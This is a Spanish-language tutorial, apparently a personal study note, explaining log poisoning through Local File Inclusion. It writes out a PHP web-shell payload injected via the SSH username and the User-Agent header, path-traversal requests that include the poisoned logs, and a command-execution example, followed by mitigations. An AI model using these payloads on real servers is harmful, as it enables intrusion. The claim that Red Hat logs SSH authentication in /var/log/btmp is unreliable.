
El **Log Poisoning** es una técnica de ataque que aprovecha vulnerabilidades en el manejo de archivos de registro para lograr objetivos maliciosos, como la **Ejecución Remota de Comandos (RCE)**. Es una estrategia particularmente peligrosa cuando se combina con vulnerabilidades de inclusión de archivos locales (**LFI**, Local File Inclusion).

A continuación, se presenta una explicación detallada sobre cómo funciona este ataque, ejemplos de escenarios prácticos y recomendaciones de mitigación.

---

### **¿Qué es el Log Poisoning?**

El Log Poisoning consiste en **inyectar código malicioso** en archivos de registro generados por una aplicación (como `auth.log` de SSH o `access.log` de Apache). Si la aplicación vulnerable tiene una falla de LFI, el atacante puede:

1. Acceder al archivo de registro.
2. Incluirlo en la ejecución de la aplicación.
3. Hacer que el servidor interprete el código malicioso inyectado, logrando RCE.

---

### **¿Cómo funciona?**

#### **Fases de un ataque de Log Poisoning**

1. **Explotación de LFI**:
    
    - El atacante aprovecha una vulnerabilidad de LFI para acceder a los archivos de registro del servidor, como:
        - `auth.log` de SSH.
        - `access.log` de Apache.
    - Ejemplo de solicitud LFI:
        
        ```
        http://example.com/index.php?page=../../var/log/auth.log
        ```
        
2. **Inyección de código malicioso**:
    
    - El atacante manipula las entradas registradas en los archivos de registro con código PHP u otros comandos maliciosos.
    - **Casos comunes**:
        - **Inyección en el campo de usuario** (SSH):  
            Durante un intento de autenticación SSH, el atacante introduce algo como:
            
            ```
            <?php system($_GET['cmd']); ?>
            ```
            
            Esto se registra en `auth.log`.
            
        - **Inyección en el campo User-Agent** (Apache):  
            En una solicitud HTTP, el atacante envía un encabezado User-Agent malicioso:
            
            ```
            User-Agent: <?php system($_GET['cmd']); ?>
            ```
            
            Esto se registra en `access.log`.
            
3. **Ejecución del código malicioso**:
    
    - La aplicación vulnerada incluye el archivo de registro con el código malicioso y lo ejecuta:
        
        ```
        http://example.com/index.php?page=../../var/log/access.log&cmd=id
        ```
        
    - En este ejemplo, el parámetro `cmd` ejecutará el comando `id` en el servidor.

---

### **Escenarios prácticos**

#### **1. Log Poisoning con `auth.log` (SSH)**

- El atacante realiza un intento de autenticación fallido en SSH utilizando el siguiente usuario:
    
    ```
    <?php system($_GET['cmd']); ?>
    ```
    
- Esto se registra en `/var/log/auth.log`:
    
    ```
    Failed password for <?php system($_GET['cmd']); ?> from 192.168.1.1 port 22 ssh2
    ```
    
- Posteriormente, el atacante accede al archivo mediante LFI y ejecuta el código PHP.

#### **2. Log Poisoning con `access.log` (Apache)**

- El atacante envía una solicitud HTTP con un User-Agent malicioso:
    
    ```
    GET / HTTP/1.1
    Host: example.com
    User-Agent: <?php system($_GET['cmd']); ?>
    ```
    
- Esto queda registrado en `/var/log/apache2/access.log`:
    
    ```
    192.168.1.1 - - [25/Jan/2025:10:00:00 +0000] "GET / HTTP/1.1" 200 - "<?php system($_GET['cmd']); ?>"
    ```
    
- Luego, incluye el archivo con una solicitud LFI para ejecutar comandos en el servidor.

---

### **Consideraciones sobre archivos de registro**

1. **Sistemas basados en Debian/Ubuntu**:
    
    - Los eventos de autenticación SSH generalmente se registran en `/var/log/auth.log`.
2. **Sistemas basados en Red Hat/CentOS**:
    
    - Estos sistemas suelen registrar los eventos de autenticación en `/var/log/btmp`.
3. **Otros nombres de archivos**:
    
    - Algunos sistemas pueden tener configuraciones específicas que utilicen nombres distintos para los logs.

---

### **Mitigación del Log Poisoning**

1. **Validación de entradas del usuario**:
    
    - Sanitizar las entradas antes de escribirlas en los registros.
    - Ejemplo en PHP:
        
        ```php
        $user_input = htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8');
        ```
        
2. **Evitar vulnerabilidades LFI**:
    
    - Validar las rutas y nombres de archivo permitidos:
        
        ```php
        $allowed_pages = ['home', 'about', 'contact'];
        if (in_array($_GET['page'], $allowed_pages)) {
            include($_GET['page'] . '.php');
        } else {
            die('Acceso denegado');
        }
        ```
        
3. **Restringir permisos de archivos de registro**:
    
    - Limitar el acceso a archivos como `auth.log` y `access.log` solo a usuarios autorizados.
    - Configurar permisos adecuados:
        
        ```bash
        chmod 640 /var/log/auth.log
        chown root:adm /var/log/auth.log
        ```
        
4. **Evitar interpretaciones directas de logs**:
    
    - Deshabilitar las inclusiones dinámicas de archivos o directorios en código del servidor.
5. **Configuración de PHP**:
    
    - Deshabilitar la ejecución remota y las inclusiones de archivos:
        
```ini
allow_url_include = Off
allow_url_fopen = Off
```
        
6. **Uso de herramientas de seguridad**:
    
    - Implementar Web Application Firewalls (WAF) para detectar y bloquear solicitudes maliciosas.

---

### **Conclusión**

El Log Poisoning es un ataque sofisticado que, al combinarse con LFI, puede comprometer gravemente un servidor. Por ello, es fundamental implementar buenas prácticas de programación, proteger los archivos de registro y realizar pruebas de seguridad periódicas para mitigar riesgos.

[[OWASP]]
[[Local File Inclusion (LFI)]]